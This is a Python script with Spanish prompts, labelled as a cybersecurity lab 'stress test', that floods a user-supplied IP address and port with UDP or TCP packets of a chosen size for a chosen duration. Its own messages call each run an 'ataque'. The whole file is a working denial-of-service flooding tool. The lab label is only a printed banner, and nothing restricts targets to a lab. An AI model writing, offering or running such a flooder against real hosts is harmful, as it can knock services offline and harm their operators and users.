import socket
import time
import threading

def udp_attack(target_ip, target_port, packet_size, duration, delay):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = b'A' * packet_size
    timeout = time.time() + duration

    print(f"[+] Comenzando ataque UDP a {target_ip}:{target_port} (paquete de {packet_size} bytes) por {duration} segundos.")

    while time.time() < timeout:
        try:
            sock.sendto(bytes_to_send, (target_ip, target_port))
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Error en envío UDP: {e}")

    print("[+] Ataque UDP finalizado.")

def tcp_attack(target_ip, target_port, packet_size, duration, delay):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    timeout = time.time() + duration

    try:
        sock.connect((target_ip, target_port))
        print(f"[+] Conectado a {target_ip}:{target_port} (TCP).")
    except Exception as e:
        print(f"[!] No se pudo conectar por TCP: {e}")
        return

    data = b'B' * packet_size

    while time.time() < timeout:
        try:
            sock.send(data)
            time.sleep(delay)
        except Exception as e:
            print(f"[!] Error en envío TCP: {e}")
            break

    sock.close()
    print("[+] Ataque TCP finalizado.")

def main():
    print("=== Laboratorio de Ciberseguridad - Prueba de Stress a Servidor ===")

    target_ip = input("IP del servidor de laboratorio: ").strip()
    target_port = int(input("Puerto objetivo (1-65535): ").strip())
    protocol = input("Protocolo (udp/tcp): ").strip().lower()
    packet_size = int(input("Tamaño del paquete (bytes): ").strip())
    duration = int(input("Duración del ataque (segundos): ").strip())
    delay = float(input("Delay entre envíos (segundos, recomendado 0.01): ").strip())

    print("\n--- Confirmación ---")
    print(f"IP: {target_ip}")
    print(f"Puerto: {target_port}")
    print(f"Protocolo: {protocol.upper()}")
    print(f"Tamaño de paquete: {packet_size} bytes")
    print(f"Duración: {duration} segundos")
    print(f"Delay: {delay} segundos")

    confirmar = input("¿Deseas iniciar el ataque? (si/no): ").strip().lower()
    if confirmar != "si":
        print("Ataque cancelado.")
        return

    if protocol == 'udp':
        udp_attack(target_ip, target_port, packet_size, duration, delay)
    elif protocol == 'tcp':
        tcp_attack(target_ip, target_port, packet_size, duration, delay)
    else:
        print("[!] Protocolo no soportado. Usa 'udp' o 'tcp'.")

if __name__ == "__main__":
    main()
